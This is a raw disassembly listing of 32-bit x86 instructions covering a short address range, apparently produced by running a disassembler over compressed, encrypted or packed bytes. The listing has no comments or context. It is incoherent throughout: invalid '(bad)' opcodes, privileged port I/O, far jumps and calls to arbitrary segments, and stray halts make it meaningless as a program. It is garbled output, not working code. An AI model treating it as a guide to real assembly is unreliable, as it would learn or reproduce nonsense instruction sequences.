  41ef2b:	lea    esp,[edi]
  41ef2d:	adc    ebp,DWORD PTR [ebx]
  41ef2f:	scas   eax,DWORD PTR es:[edi]
  41ef30:	fistp  WORD PTR [ebx+ebp*8-0x63]
  41ef34:	int3   
  41ef35:	pop    esi
  41ef36:	jno    0x41ef8f
  41ef38:	imul   BYTE PTR [ebx+0x5e]
  41ef3b:	sahf   
  41ef3c:	pop    ds
  41ef3d:	pop    ebp
  41ef3e:	fbstp  TBYTE PTR ds:0xadae79ae
  41ef44:	test   al,0x6b
  41ef46:	fiadd  DWORD PTR [esi-0x3df1423]
  41ef4c:	retf   
  41ef4d:	or     al,0xb3
  41ef4f:	cs inc esp
  41ef51:	mov    cl,0x3a
  41ef53:	cdq    
  41ef54:	fstp   QWORD PTR [ebx+0xc]
  41ef57:	cmc    
  41ef58:	add    BYTE PTR [eax-0x655b1b98],al
  41ef5e:	sub    dl,bl
  41ef60:	jns    0x41ef1b
  41ef62:	mov    cl,0x54
  41ef64:	dec    ecx
  41ef65:	test   BYTE PTR [ebx],bl
  41ef67:	inc    ebp
  41ef68:	pavgb  mm3,mm1
  41ef6b:	xchg   ecx,esp
  41ef6d:	sbb    eax,0x2738bd75
  41ef72:	dec    eax
  41ef73:	xor    ch,BYTE PTR [ebp+eax*2+0x11]
  41ef77:	dec    ebx
  41ef78:	test   ah,0xb3
  41ef7b:	test   dl,dh
  41ef7d:	sbb    ecx,ebp
  41ef7f:	ins    BYTE PTR es:[edi],dx
  41ef80:	les    ebx,FWORD PTR [ebx-0x44e3912e]
  41ef86:	rol    BYTE PTR [eax-0x69],0xe1
  41ef8a:	mov    dh,0xd2
  41ef8c:	add    BYTE PTR [esi-0x25f85197],ah
  41ef92:	addr16 lock add ebp,0x67
  41ef97:	mov    esp,DWORD PTR [ebx]
  41ef99:	ins    BYTE PTR es:[edi],dx
  41ef9a:	ror    BYTE PTR [edi],1
  41ef9c:	mov    ds:0x88685bb9,al
  41efa1:	jmp    0x41efd4
  41efa3:	pop    ebx
  41efa4:	(bad)  
  41efa5:	push   ss
  41efa6:	jno    0x41ef60
  41efa8:	jo     0x41ef37
  41efaa:	das    
  41efab:	aaa    
  41efac:	es dec ebx
  41efae:	pop    es
  41efaf:	push   esp
  41efb0:	sbb    al,BYTE PTR [eax-0x3d]
  41efb3:	js     0x41ef48
  41efb5:	xchg   ecx,eax
  41efb6:	aaa    
  41efb7:	and    ecx,DWORD PTR [ebx+0x57]
  41efba:	into   
  41efbb:	das    
  41efbc:	xchg   DWORD PTR [ebx*1+0x7aedd064],edi
  41efc3:	repz adc dh,ah
  41efc6:	mov    ecx,ds
  41efc8:	cmc    
  41efc9:	xchg   ebp,eax
  41efca:	daa    
  41efcb:	inc    esi
  41efcc:	lods   eax,DWORD PTR ds:[esi]
  41efcd:	popa   
  41efce:	in     eax,dx
  41efcf:	adc    DWORD PTR [esi],ecx
  41efd1:	mov    dh,0x52
  41efd3:	in     al,dx
  41efd4:	mov    ebp,0x279b8da
  41efd9:	push   edx
  41efda:	ds pusha 
  41efdc:	add    BYTE PTR [ebx-0x6b4f03fa],0x1d
  41efe3:	inc    edx
  41efe4:	mov    ds:0xc103edba,al
  41efe9:	sub    BYTE PTR [ecx-0xa],bl
  41efec:	mov    ds:0xa1ba785d,al
  41eff1:	js     0x41ef9f
  41eff3:	mov    ebx,0x1499a615
  41eff8:	mov    ebx,0x68785d14
  41effd:	out    0xcc,eax
  41efff:	mov    dh,0x5a
  41f001:	ds sbb eax,0xa75f87ff
  41f007:	hlt    
  41f008:	iret   
  41f009:	mov    esp,0x5045840f
  41f00e:	xlat   BYTE PTR ds:[ebx]
  41f00f:	ins    BYTE PTR es:[edi],dx
  41f010:	mov    cl,0x89
  41f012:	fs jb  0x41f02d
  41f015:	pop    edx
  41f016:	cmovno esi,DWORD PTR [ecx]
  41f019:	or     al,0xe3
  41f01b:	dec    eax
  41f01c:	jle    0x41efc9
  41f01e:	dec    ebx
  41f01f:	add    ebp,0x72897e48
  41f025:	or     ebx,ebp
  41f027:	es (bad) 
  41f029:	in     eax,dx
  41f02a:	mov    ecx,0xf29b382d
  41f02f:	inc    edx
  41f030:	dec    ebx
  41f031:	test   eax,ebx
  41f033:	mov    al,0x89
  41f035:	mov    bh,0x2e
  41f037:	dec    edx
  41f038:	retf   0x154d
  41f03b:	addr16 mov al,0xe7
  41f03e:	(bad)  
  41f03f:	hlt    
  41f040:	repz sbb al,BYTE PTR [esi+edi*1+0xe]
  41f045:	cmp    al,0x19
  41f047:	fisubr WORD PTR [ebx]
  41f049:	xor    al,0x5f
  41f04b:	rcl    DWORD PTR [ebp+0x55dd81a3],cl
  41f051:	mov    ch,0xf7
  41f053:	xchg   al,ah
  41f055:	and    al,0xae
  41f057:	hlt    
  41f058:	push   edi
  41f059:	pop    ss
  41f05a:	test   BYTE PTR ds:0x441baac9,ah
  41f060:	ret    
  41f061:	sbb    dh,BYTE PTR [ebx-0x1e]
  41f064:	gs out dx,eax
  41f066:	or     DWORD PTR [esi-0x38a75811],edx
  41f06c:	sub    edx,DWORD PTR [esi+ebp*4]
  41f06f:	dec    edi
  41f070:	sbb    eax,0x8b4ea124
  41f075:	add    al,0x75
  41f077:	popf   
  41f078:	push   cs
  41f079:	jae    0x41f038
  41f07b:	sub    BYTE PTR [eax-0x99cf480],dh
  41f081:	mov    esi,edx
  41f083:	popa   
  41f084:	xchg   BYTE PTR [ebx+0x77],dh
  41f087:	push   ds
  41f088:	jno    0x41f0e7
  41f08a:	rol    BYTE PTR [ebx+0x17],0x2a
  41f08e:	daa    
  41f08f:	jmp    0x41f0ac
  41f091:	das    
  41f092:	mov    ebx,0xf3185c23
  41f097:	fsub   DWORD PTR [edx]
  41f099:	stc    
  41f09a:	sbb    DWORD PTR [ecx],edx
  41f09c:	out    0xb3,al
  41f09e:	ret    0xf586
  41f0a1:	fbstp  TBYTE PTR [ecx-0x413571f0]
  41f0a7:	fsub   st(5),st
  41f0a9:	dec    ebp
  41f0aa:	enter  0xea48,0xab
  41f0ae:	mov    edx,0x106af1fa
  41f0b3:	in     eax,dx
  41f0b4:	pusha  
  41f0b5:	jl     0x41f0f3
  41f0b7:	add    eax,0x8ecab1be
  41f0bc:	pop    ds
  41f0bd:	pop    ds
  41f0be:	dec    ebp
  41f0bf:	fstp   QWORD PTR [ebp+0x7da55a2a]
  41f0c5:	jge    0x41f0b0
  41f0c7:	shl    BYTE PTR [edi],1
  41f0c9:	inc    edx
  41f0ca:	mov    esp,0xb706a2b8
  41f0cf:	mov    cl,ch
  41f0d1:	add    DWORD PTR [esi+0x7527ac8c],edx
  41f0d7:	pop    ds
  41f0d8:	pop    ebx
  41f0d9:	mov    eax,0x9578a26
  41f0de:	fcomp  QWORD PTR [edi-0x24]
  41f0e1:	jne    0x41f099
  41f0e3:	daa    
  41f0e4:	rol    DWORD PTR [eax+0x3ea193ad],cl
  41f0ea:	add    edx,DWORD PTR [ecx]
  41f0ec:	int    0x24
  41f0ee:	push   ebp
  41f0ef:	cmp    BYTE PTR [esi],al
  41f0f1:	outs   dx,DWORD PTR ds:[esi]
  41f0f2:	jno    0x41f120
  41f0f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0f5:	arpl   WORD PTR [edi+0x210d7d29],bp
  41f0fb:	adc    DWORD PTR [ebx+0x71075df2],ebp
  41f101:	daa    
  41f102:	or     ebx,eax
  41f104:	add    eax,0x74fd2cc0
  41f109:	rcr    cl,cl
  41f10b:	jecxz  0x41f102
  41f10d:	test   bh,0x84
  41f110:	jne    0x41f0a0
  41f112:	repz mov dl,BYTE PTR [edx+0x758a530e]
  41f119:	cmc    
  41f11a:	es pushf 
  41f11c:	inc    ebx
  41f11d:	jns    0x41f0ce
  41f11f:	xchg   esi,eax
  41f120:	mov    edx,0x89a44fe8
  41f125:	or     DWORD PTR [ecx],edi
  41f127:	fnstenv [ecx]
  41f129:	pop    es
  41f12a:	outs   dx,DWORD PTR ds:[esi]
  41f12b:	arpl   WORD PTR [edx+0x3cf868b4],si
  41f131:	cmp    al,0x43
  41f133:	pop    ds
  41f134:	or     eax,0x8fa61ec3
  41f139:	xchg   esi,eax
  41f13a:	call   0xbc1c:0xb216991
  41f141:	fist   DWORD PTR ds:0x7984e97
  41f147:	mov    ds:0x1222aaa5,eax
  41f14c:	xor    al,0x49
  41f14e:	jae    0x41f0dd
  41f150:	inc    ebp
  41f151:	hlt    
  41f152:	push   0xffffffb7
  41f154:	in     eax,0xae
  41f156:	xchg   ecx,eax
  41f157:	adc    DWORD PTR [edx-0x58],ebp
  41f15a:	jbe    0x41f0f9
  41f15c:	jmp    0x515eb7ef
  41f161:	sub    edi,DWORD PTR [ebp+0x28]
  41f164:	pusha  
  41f165:	out    0x67,eax
  41f167:	cmp    BYTE PTR [edx-0x4c],al
  41f16a:	jmp    FWORD PTR [ecx+eax*8+0x471b20f]
  41f171:	pop    esi
  41f172:	fsubr  DWORD PTR [ebx+0x5b]
  41f175:	cmp    al,0xc
  41f177:	mov    eax,ds:0xb7f14e82
  41f17c:	das    
  41f17d:	lahf   
  41f17e:	lds    edi,FWORD PTR [ebx+0x1aad13b0]
  41f184:	inc    ecx
  41f185:	mov    DWORD PTR [eax],edi
  41f187:	xor    eax,0xe622ae58
  41f18c:	jb     0x41f206
  41f18e:	sbb    al,0x67
  41f190:	retf   
  41f191:	jnp    0x41f185
  41f193:	mov    esp,0x2002cd1e
  41f198:	mov    al,al
  41f19a:	inc    ecx
  41f19b:	cdq    
  41f19c:	fdiv   st,st(6)
  41f19e:	mov    edi,0x5e2d55d1
  41f1a3:	popa   
  41f1a4:	xchg   ecx,eax
  41f1a5:	and    eax,0x7052fb42
  41f1aa:	jmp    0x75a5:0xdd6cd43e
  41f1b1:	jnp    0x41f1ef
  41f1b3:	push   esi
  41f1b4:	lods   al,BYTE PTR ds:[esi]
  41f1b5:	int    0xbf
  41f1b7:	mov    al,0xb0
  41f1b9:	popf   
  41f1ba:	pop    eax
  41f1bb:	jmp    0xd0395843
  41f1c0:	lock pushf 
  41f1c2:	dec    ebx
  41f1c3:	adc    al,0x86
  41f1c5:	into   
  41f1c6:	jg     0x41f1f6
  41f1c8:	adc    BYTE PTR [ecx+ebx*8+0x742396e5],dh
  41f1cf:	jbe    0x41f154
  41f1d1:	addr16 retf 
  41f1d3:	je     0x41f179
  41f1d5:	enter  0x780a,0x0
  41f1d9:	mov    ds:0xc8193249,eax
  41f1de:	sbb    al,0xff
  41f1e0:	je     0x41f20c
  41f1e2:	pop    es
  41f1e3:	dec    edi
  41f1e4:	or     al,dh
  41f1e6:	(bad)  
  41f1e7:	mov    al,0xcf
  41f1e9:	sbb    DWORD PTR [ecx-0x47730839],esp
  41f1ef:	dec    ebx
  41f1f0:	ins    DWORD PTR es:[edi],dx
  41f1f1:	out    0x79,al
  41f1f3:	loop   0x41f1c3
  41f1f5:	jmp    0x2ee1c8f1
  41f1fa:	push   edx
  41f1fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1fc:	xchg   edx,eax
  41f1fd:	mov    bh,bh
  41f1ff:	pop    ebp
  41f200:	aaa    
  41f201:	gs adc eax,0x5354699c
  41f207:	jmp    0xfbe2:0xbda027d5
  41f20e:	sahf   
  41f20f:	xor    cl,dl
  41f211:	dec    edx
  41f212:	sar    BYTE PTR [edx+ecx*4],1
  41f215:	dec    ebx
  41f216:	add    eax,0x61bcae2a
  41f21b:	test   eax,0xcc513cb6
  41f220:	pop    esp
  41f221:	hlt    
  41f222:	jb     0x41f289
  41f224:	in     eax,0x4c
  41f226:	rcr    bl,1
  41f228:	jmp    0x2116:0x87118a1f
  41f22f:	imul   edx,DWORD PTR [edi],0x12967956
  41f235:	add    DWORD PTR [ecx+0x32d6372e],ecx
  41f23b:	cdq    
  41f23c:	aam    0x3b
  41f23e:	aas    
  41f23f:	dec    edi
  41f240:	(bad)  
  41f242:	xchg   ecx,eax
  41f243:	(bad)  
  41f244:	mov    edx,0x4a2c2dc8
  41f249:	jb     0x41f27a
  41f24b:	ins    BYTE PTR es:[edi],dx
  41f24c:	ss test al,0xa3
  41f24f:	mov    al,ds:0xe72d9f49
  41f254:	(bad)  
  41f255:	out    0x52,eax
  41f257:	adc    DWORD PTR [ebx-0x72a3b386],esp
  41f25d:	cmp    eax,0xcc943b34
  41f262:	sub    al,0x14
  41f264:	mov    dh,0x9e
  41f266:	lea    ebx,[esi+eiz*2-0x1]
  41f26a:	fistp  QWORD PTR [edx]
  41f26c:	pop    ebp
  41f26d:	lahf   
  41f26e:	mov    DWORD PTR [edx],ebx
  41f270:	test   eax,0x381c5c11
  41f275:	out    dx,eax
  41f276:	mov    DWORD PTR [eax-0x4dd03aeb],edi
  41f27c:	xchg   BYTE PTR [ebp+ebp*4+0x6975cdb9],bh
  41f283:	cld    
  41f284:	push   0xffffffdc
  41f286:	jne    0x41f2f5
  41f288:	and    bl,bl
  41f28a:	mov    ah,0xf1
  41f28c:	cmp    DWORD PTR [ecx+0x72fcf961],eax
  41f292:	mov    ebx,0xfb1274e7
  41f297:	gs addr16 sti 
  41f29a:	dec    edi
  41f29b:	mov    al,0xad
  41f29d:	out    dx,al
  41f29e:	stc    
  41f29f:	mov    dl,0xe6
  41f2a1:	das    
  41f2a2:	dec    esi
  41f2a3:	cli    
  41f2a4:	daa    
  41f2a5:	imul   esi,edi,0x8b3e446a
  41f2ab:	dec    edi
  41f2ac:	cmp    ebp,ebx
  41f2ae:	inc    esp
  41f2af:	xchg   ch,al
  41f2b1:	ret    
  41f2b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2b3:	daa    
  41f2b4:	leave  
  41f2b5:	aaa    
  41f2b6:	mov    eax,ds:0xff5417a1
  41f2bb:	inc    BYTE PTR [ebp-0x691ecefc]
  41f2c1:	jnp    0x41f2a2
  41f2c3:	out    0xb0,eax
  41f2c5:	mov    esi,0x2c8dfb90
  41f2ca:	jbe    0x41f2a6
  41f2cc:	inc    esp
  41f2cd:	sub    ecx,DWORD PTR [ebp-0x7aa65b1a]
  41f2d3:	test   DWORD PTR [esi+0x12],edi
  41f2d6:	sar    BYTE PTR [edi+0x23],cl
  41f2d9:	xchg   ebx,eax
  41f2da:	neg    BYTE PTR [edx+0x47052544]
  41f2e0:	std    
  41f2e1:	mov    cl,0x7
  41f2e3:	push   edi
  41f2e4:	push   ds
  41f2e5:	loopne 0x41f2f2
  41f2e7:	enter  0x779a,0xa9
  41f2eb:	mov    esp,0x3e19d48d
  41f2f0:	aas    
  41f2f1:	adc    al,0x8c
  41f2f3:	add    esi,DWORD PTR [ebp-0x1c]
  41f2f6:	pop    ss
  41f2f7:	ret    
  41f2f8:	mov    ebp,0xe3a5b086
  41f2fd:	dec    edi
  41f2fe:	inc    esi
  41f2ff:	inc    edi
  41f300:	jb     0x41f33e
  41f302:	test   edi,ecx
  41f304:	stos   BYTE PTR es:[edi],al
  41f305:	es into 
  41f307:	cmp    DWORD PTR [edi],ecx
  41f309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f30a:	mov    WORD PTR [edx],?
  41f30c:	add    dl,0x43
  41f30f:	cs adc edi,esi
  41f312:	adc    dl,0xd2
  41f315:	xchg   ebx,eax
  41f316:	clc    
  41f317:	xchg   ch,dl
  41f319:	jo     0x41f31e
  41f31b:	cmp    DWORD PTR [edx-0x2],edx
  41f31e:	mov    DWORD PTR [edi-0x2f60bc68],eax
  41f324:	inc    ebx
  41f325:	push   0xffffffb0
  41f327:	add    al,0x49
  41f329:	lods   eax,DWORD PTR ds:[esi]
  41f32a:	inc    esi
  41f32b:	adc    DWORD PTR [ebx+0x34],edi
  41f32e:	xchg   esi,eax
  41f32f:	push   cs
  41f330:	call   0x5b1ffd79
  41f335:	add    BYTE PTR [ebx-0x3f75aee0],al
  41f33b:	sub    ebx,DWORD PTR [eax-0x3e]
  41f33e:	inc    ebp
  41f33f:	jl     0x41f374
  41f341:	data16 stos WORD PTR es:[edi],ax
  41f344:	xor    al,0x94
  41f346:	pop    es
  41f347:	dec    ebp
  41f348:	ficomp WORD PTR [edi]
  41f34a:	add    eax,esi
  41f34c:	mov    dh,BYTE PTR [ebx+0x3a]
  41f34f:	pop    ss
  41f350:	mov    ebp,0xc1b460a
  41f355:	mov    bl,0x8e
  41f357:	mov    edi,0x13283918
  41f35c:	cmp    DWORD PTR [esp+ebx*1],edx
  41f35f:	cs popa 
  41f361:	jae    0x41f325
  41f363:	mov    cl,BYTE PTR [edi-0x45]
  41f366:	(bad)  
  41f367:	jmp    FWORD PTR [ecx-0x28d3e960]
  41f36d:	jo     0x41f32d
  41f36f:	les    edx,FWORD PTR [edi+ebx*2+0x272f4fb2]
  41f376:	dec    BYTE PTR ds:0xa1a331d5
  41f37c:	(bad)  
  41f37d:	jnp    0x41f354
  41f37f:	leave  
  41f380:	inc    ebp
  41f381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f383:	push   edx
  41f384:	ret    
  41f385:	out    dx,eax
  41f386:	dec    ecx
  41f387:	mov    esi,0x81812524
  41f38c:	ss push edx
  41f38e:	ss and al,0x65
  41f391:	in     al,dx
  41f392:	mov    WORD PTR [esi],?
  41f394:	sbb    eax,0x8e0b383
  41f399:	test   al,0xc4
  41f39b:	mov    eax,ds:0x7d0166ec
  41f3a0:	push   ebp
  41f3a1:	cmp    al,0x15
  41f3a3:	lahf   
  41f3a4:	or     DWORD PTR [esi-0x6793ad09],ebp
  41f3aa:	fwait
  41f3ab:	enter  0xbd18,0x0
  41f3af:	arpl   WORD PTR es:[eax-0x7e],sp
  41f3b3:	sub    al,0x49
  41f3b5:	in     eax,0xfc
  41f3b7:	ss adc eax,0x10141378
  41f3bd:	mov    DWORD PTR [esi+eax*2-0x2a378de0],0x2e17ba66
  41f3c8:	push   ebp
  41f3c9:	push   edx
  41f3ca:	(bad)  
  41f3cb:	add    BYTE PTR [esi+ecx*2-0x37a2fe63],dl
  41f3d2:	shl    DWORD PTR [ebx],1
  41f3d4:	(bad)  
  41f3d5:	lock push edx
  41f3d7:	sub    ch,BYTE PTR ds:0x7a6604eb
  41f3dd:	xchg   ecx,eax
  41f3de:	in     al,0xc9
  41f3e0:	shr    bl,1
  41f3e2:	pop    edx
  41f3e3:	(bad)  
  41f3e4:	es mov edx,0xdd5f5c89
  41f3ea:	xchg   edi,eax
  41f3eb:	fs inc esi
  41f3ed:	sbb    edi,edx
  41f3ef:	pop    es
  41f3f0:	cmp    DWORD PTR [ecx-0xb],edi
  41f3f3:	ins    BYTE PTR es:[edi],dx
  41f3f4:	lods   al,BYTE PTR ds:[esi]
  41f3f5:	nop
  41f3f6:	ficom  DWORD PTR [esp+esi*1]
  41f3f9:	fadd   st,st(7)
  41f3fb:	ja     0x41f3ff
  41f3fd:	pop    ds
  41f3fe:	push   esp
  41f3ff:	xor    DWORD PTR [ebx],0xffffffb8
  41f402:	mov    edi,0x9c04fa95
  41f407:	add    al,0x80
  41f409:	pop    edi
  41f40a:	nop
  41f40b:	cmc    
  41f40c:	push   eax
  41f40d:	lods   eax,DWORD PTR ds:[esi]
  41f40e:	enter  0xda52,0xbf
  41f412:	mov    ?,esi
  41f414:	or     eax,0xaed78885
  41f419:	push   edx
  41f41a:	jmp    0x7cb003e1
  41f41f:	lods   al,BYTE PTR ds:[esi]
  41f420:	in     eax,0x29
  41f422:	data16 jae 0x41f3e6
  41f425:	leave  
  41f426:	xchg   edx,eax
  41f427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f428:	jno    0x41f428
  41f42a:	lods   eax,DWORD PTR ds:[esi]
  41f42b:	sbb    al,BYTE PTR [eax]
  41f42d:	ret    
  41f42e:	mov    al,ds:0xf4647b38
  41f433:	je     0x41f4ac
  41f435:	adc    DWORD PTR [ebx-0x74],ebp
  41f438:	xchg   ebx,eax
  41f439:	push   ds
  41f43a:	inc    eax
  41f43b:	data16 add BYTE PTR [ebp+0x41],ah
  41f43f:	jp     0x41f493
  41f441:	pushf  
  41f442:	fmul   DWORD PTR [edi]
  41f444:	mov    cl,BYTE PTR [ecx]
  41f446:	aas    
  41f447:	jl     0x41f3cd
  41f449:	pop    esi
  41f44a:	jns    0x41f42d
  41f44c:	and    dl,ah
  41f44e:	adc    BYTE PTR [ecx+0x5ba353ab],0x39
  41f455:	(bad)  
  41f456:	into   
  41f457:	or     eax,0x98c97e0c
  41f45c:	jmp    0xa77047
  41f461:	or     bp,dx
  41f464:	dec    eax
  41f465:	mov    bh,0x38
  41f467:	scas   al,BYTE PTR es:[edi]
  41f468:	sbb    edx,DWORD PTR [edi-0x6b2305ef]
  41f46e:	or     ebx,edx
  41f470:	out    0x9b,eax
  41f472:	add    DWORD PTR [ebp-0x2f],0x6b35b714
  41f479:	jbe    0x41f42b
  41f47b:	mov    ds:0xe7cd271e,eax
  41f480:	cdq    
  41f481:	fldenv [esi]
  41f483:	vpavgw ymm3,ymm5,YMMWORD PTR [esi]
  41f487:	sub    edx,esi
  41f489:	retf   0xf994
  41f48c:	cmc    
  41f48d:	lds    edx,FWORD PTR [esi+0x2d]
  41f490:	xchg   ebp,eax
  41f491:	and    esp,DWORD PTR [ebp-0x64c83d23]
  41f497:	sti    
  41f498:	pop    es
  41f499:	mov    edx,0xb53b8064
  41f49e:	push   ecx
  41f49f:	(bad)  
  41f4a0:	std    
  41f4a1:	cmp    bl,BYTE PTR [eax+0x6afa21aa]
  41f4a7:	inc    edx
  41f4a8:	pop    edx
  41f4a9:	fstp   TBYTE PTR [edi+0x5c]
  41f4ac:	loopne 0x41f438
  41f4ae:	je     0x41f49d
  41f4b0:	xchg   ebx,eax
  41f4b1:	js     0x41f4fb
  41f4b3:	mov    ah,0xe8
  41f4b5:	or     DWORD PTR [eax-0x17371842],esp
  41f4bb:	adc    eax,0x3e590029
  41f4c0:	cmp    edx,edi
  41f4c2:	cli    
  41f4c3:	jmp    DWORD PTR [ebp-0x4a]
  41f4c6:	repz xchg esp,eax
  41f4c8:	cmp    eax,0x922dd46
  41f4cd:	push   0xdfc2e4cc
  41f4d2:	mov    ah,0x6c
  41f4d4:	pop    esp
  41f4d5:	(bad)  
  41f4d6:	clc    
  41f4d7:	add    edx,DWORD PTR [ecx+0x4f936a93]
  41f4dd:	out    dx,eax
  41f4de:	sub    DWORD PTR [esi],edi
  41f4e0:	stos   BYTE PTR es:[edi],al
  41f4e1:	mov    edi,0x30d806e
  41f4e6:	int3   
  41f4e7:	xor    al,0xf3
  41f4e9:	dec    edi
  41f4ea:	push   cs
  41f4eb:	sbb    BYTE PTR [ebx],ah
  41f4ed:	and    DWORD PTR [eax],0xc2d881a7
  41f4f3:	leave  
  41f4f4:	push   0x260ba82d
  41f4f9:	mov    ds:0x2a02a8e5,al
  41f4fe:	ins    DWORD PTR es:[edi],dx
  41f4ff:	push   0x9895c55
  41f504:	push   edi
  41f505:	jecxz  0x41f566
  41f507:	dec    edx
  41f508:	or     cl,BYTE PTR [ecx-0x79f3be9d]
  41f50e:	mov    edi,0xd9dc45ea
  41f513:	push   eax
  41f514:	retf   0xb394
  41f517:	pop    edx
  41f518:	rcr    DWORD PTR ds:0xa738f959,1
  41f51e:	in     eax,dx
  41f51f:	push   ds
  41f520:	int3   
  41f521:	cmp    BYTE PTR [esi+0x6507b6ba],al
  41f527:	inc    bp
  41f529:	xchg   edx,eax
  41f52a:	push   ebx
  41f52b:	test   DWORD PTR [ebp-0x78],ebp
  41f52e:	inc    esp
  41f52f:	(bad)  
  41f530:	jge    0x41f516
  41f532:	loopne 0x41f4b6
  41f534:	mov    DWORD PTR [ecx],esi
  41f536:	bound  ebp,QWORD PTR [ebx+ecx*2+0x28]
  41f53a:	fisub  DWORD PTR [esi-0x33]
  41f53d:	sbb    DWORD PTR [edx-0x73],esp
  41f540:	scas   eax,DWORD PTR es:[edi]
  41f541:	ror    DWORD PTR [ecx+esi*2-0x4e],0x5d
  41f546:	leave  
  41f547:	cdq    
  41f548:	xchg   edx,eax
  41f549:	jne    0x41f59f
  41f54b:	mov    eax,ds:0x4efe4a8a
  41f550:	lods   eax,DWORD PTR ds:[esi]
  41f551:	jmp    0xd438c48b
  41f556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f557:	ins    BYTE PTR es:[edi],dx
  41f558:	dec    edi
  41f559:	sub    DWORD PTR [eax+ebx*8],esi
  41f55c:	popf   
  41f55d:	iret   
  41f55e:	iret   
  41f55f:	add    ebx,DWORD PTR fs:[edi-0x70569986]
  41f566:	mov    dh,0xb8
  41f568:	xchg   edx,eax
  41f569:	mov    cl,0x8f
  41f56b:	adc    ebx,DWORD PTR [ebx]
  41f56d:	int    0xc2
  41f56f:	js     0x41f5b7
  41f571:	fldl2e 
  41f573:	dec    ecx
  41f574:	sub    esp,esi
  41f576:	adc    eax,0xf5b4a583
  41f57b:	mov    eax,0x6fa3a9c9
  41f580:	dec    ebx
  41f581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f582:	or     al,0xa2
  41f584:	fbld   TBYTE PTR [esi]
  41f586:	arpl   WORD PTR [eax+ebx*4+0x38137523],sp
  41f58d:	mov    cl,0x8d
  41f58f:	pop    es
  41f590:	inc    esi
  41f591:	ret    
  41f592:	push   DWORD PTR [edi-0x56]
  41f595:	push   ds
  41f596:	push   ss
  41f597:	int    0x6d
  41f599:	jno    0x41f590
  41f59b:	dec    eax
  41f59c:	push   esp
  41f59d:	cmp    al,BYTE PTR [esi-0x5b]
  41f5a0:	xchg   esp,eax
  41f5a1:	jecxz  0x41f56b
  41f5a3:	push   es
  41f5a4:	test   BYTE PTR [esi],dl
  41f5a6:	xchg   ebp,eax
  41f5a7:	add    edi,DWORD PTR [edi+edi*2-0x3d8cc3f]
  41f5ae:	mov    bh,0x4
  41f5b0:	mov    WORD PTR [esi+0x4a6e342b],ss
  41f5b6:	repz aam 0x63
  41f5b9:	out    0x3e,al
  41f5bb:	popf   
  41f5bc:	jae    0x41f5a7
  41f5be:	outs   dx,DWORD PTR ds:[esi]
  41f5bf:	cmp    edx,ecx
  41f5c1:	dec    edi
  41f5c2:	mov    esi,0x30c6404a
  41f5c7:	mov    al,0xa
  41f5c9:	cmp    eax,0xdd9c4fb9
  41f5ce:	xor    ch,BYTE PTR [ebx]
  41f5d0:	push   esi
  41f5d1:	or     BYTE PTR [eax-0x360ac4f7],bh
  41f5d7:	sbb    eax,0x29374f2a
  41f5dc:	adc    eax,DWORD PTR [eax]
  41f5de:	jno    0x41f57d
  41f5e0:	jecxz  0x41f631
  41f5e2:	inc    esp
  41f5e3:	jl     0x41f60d
  41f5e5:	cli    
  41f5e6:	dec    edx
  41f5e7:	and    al,0x2a
  41f5e9:	jg     0x41f64b
  41f5eb:	pop    ds
  41f5ec:	pushf  
  41f5ed:	movsx  edi,bl
  41f5f0:	fcmovnbe st,st(3)
  41f5f2:	adc    al,0x5b
  41f5f4:	aaa    
  41f5f5:	jo     0x41f578
  41f5f7:	les    ebp,FWORD PTR [esi]
  41f5f9:	lahf   
  41f5fa:	loopne 0x41f5be
  41f5fc:	push   ds
  41f5fd:	push   edi
  41f5fe:	(bad)  
  41f5ff:	icebp  
  41f600:	adc    ebp,DWORD PTR [eax-0xb]
  41f603:	mov    ds:0xff55f3ca,al
  41f608:	aaa    
  41f609:	mov    eax,ds:0xcced6af7
  41f60e:	pop    edi
  41f60f:	jecxz  0x41f59a
  41f611:	jb     0x41f5e7
  41f613:	push   ss
  41f614:	mov    esp,0xe90b0ab3
  41f619:	pop    edi
  41f61a:	or     al,BYTE PTR [ebx]
  41f61c:	sahf   
  41f61d:	jge    0x41f603
  41f61f:	push   0xe74de64a
  41f624:	ret    0xf10a
  41f627:	jbe    0x41f605
  41f629:	sbb    ebp,DWORD PTR [ecx-0x3ebbef8e]
  41f62f:	(bad)  
  41f630:	dec    edi
  41f631:	sbb    ebp,ecx
  41f633:	inc    edi
  41f634:	xchg   DWORD PTR [eax],ebx
  41f636:	mov    ah,0x1b
  41f638:	fild   DWORD PTR [ebx+esi*1+0x5e6a52bd]
  41f63f:	call   0xed41:0xc146ecca
  41f646:	rcl    DWORD PTR [ebx-0xdbc95e0],cl
  41f64c:	pop    esp
  41f64d:	loope  0x41f670
  41f64f:	pop    ecx
  41f651:	xchg   BYTE PTR [ecx],bh
  41f653:	jae    0x41f635
  41f655:	enter  0xc56c,0xfd
  41f659:	add    edi,DWORD PTR [edi+0x2e6db8be]
  41f65f:	xchg   DWORD PTR [eax+0x69bef12f],edi
  41f665:	mov    eax,0xedee60bb
  41f66a:	daa    
  41f66b:	mov    edi,0xaa13c257
  41f670:	cs jo  0x41f6ec
  41f673:	sub    ecx,DWORD PTR ds:0x6161e9f1
  41f679:	std    
  41f67a:	pop    ebx
  41f67b:	jne    0x41f699
  41f67d:	add    esp,DWORD PTR [eax]
  41f67f:	sbb    DWORD PTR ds:0x93c6e540,0xee820247
  41f689:	jl     0x41f6b5
  41f68b:	sbb    DWORD PTR [ebx-0x56a03e36],0x2
  41f692:	(bad)  
  41f693:	mov    ebx,0x5bd1f66d
  41f698:	fwait
  41f699:	int3   
  41f69a:	jb     0x41f65f
  41f69c:	mov    ch,0xe3
  41f69e:	pop    edx
  41f69f:	mov    eax,0xf3e55f99
  41f6a4:	out    dx,eax
  41f6a5:	mov    ecx,0xc791db7
  41f6aa:	jp     0x41f675
  41f6ac:	add    cl,dh
  41f6ae:	shr    bl,cl
  41f6b0:	mov    ds:0x4946bd04,al
  41f6b5:	sub    edi,DWORD PTR [edx+edi*2]
  41f6b8:	outs   dx,BYTE PTR ds:[esi]
  41f6b9:	mov    ah,0x85
  41f6bb:	jge    0x41f664
